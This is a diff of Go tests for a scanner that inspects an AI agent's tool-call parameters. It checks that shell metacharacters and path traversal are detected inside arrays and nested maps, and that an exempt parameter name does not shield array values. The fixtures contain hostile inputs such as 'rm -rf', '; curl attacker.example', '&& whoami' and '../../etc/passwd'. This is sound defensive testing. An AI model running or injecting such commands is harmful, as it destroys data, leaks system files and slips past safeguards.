@@ -412,3 +412,72 @@ func TestScan_ConcurrentPatternMatches(t *testing.T) {
 		t.Fatalf("concurrent scan missed %d of %d matches", got, calls)
 	}
 }
+
+// hasSignal reports whether the scan emitted the given signal category.
+func hasSignal(rc *riskcontext.RiskContext, category string) bool {
+	for _, sig := range rc.Signals {
+		if sig.Category == category {
+			return true
+		}
+	}
+	return false
+}
+
+func scanToolCall(tool string, params map[string]any, cfg *config.Config) *riskcontext.RiskContext {
+	s := NewScanStage(cfg, nil)
+	rc := &riskcontext.RiskContext{
+		HookType: "on_tool_call",
+		Payload:  map[string]any{"name": tool, "params": params},
+	}
+	s.Run(rc)
+	return rc
+}
+
+func TestScan_DangerousParamsInsideArrays(t *testing.T) {
+	tests := []struct {
+		name   string
+		params map[string]any
+		want   string
+	}{
+		{
+			name:   "shell metacharacter in a string array",
+			params: map[string]any{"args": []any{"rm", "-rf", "; curl attacker.example"}},
+			want:   "shell_metacharacter",
+		},
+		{
+			name:   "path traversal in a string array",
+			params: map[string]any{"paths": []any{"../../etc/passwd"}},
+			want:   "path_traversal",
+		},
+		{
+			name: "nested inside an array of maps",
+			params: map[string]any{
+				"steps": []any{map[string]any{"cmd": "echo hi && whoami"}},
+			},
+			want: "shell_metacharacter",
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			rc := scanToolCall("shell_exec", tc.params, defaultCfg())
+			if !hasSignal(rc, tc.want) {
+				t.Errorf("array-wrapped payload evaded the %s check, got %v", tc.want, rc.Signals)
+			}
+		})
+	}
+}
+
+func TestScan_ParamScanSkipDoesNotCoverArrayValues(t *testing.T) {
+	// The skip is gated on the value being a string, so wrapping a payload in
+	// an array under an exempt parameter name must not inherit the exemption.
+	cfg := defaultCfg()
+	cfg.ToolParamScanSkip = map[string]map[string][]string{
+		"calculator": {"expression": {"shell_metacharacter"}},
+	}
+	rc := scanToolCall("calculator", map[string]any{
+		"expression": []any{"x; curl attacker.example"},
+	}, cfg)
+	if !hasSignal(rc, "shell_metacharacter") {
+		t.Errorf("array under an exempt param name inherited the exemption, got %v", rc.Signals)
+	}
+}
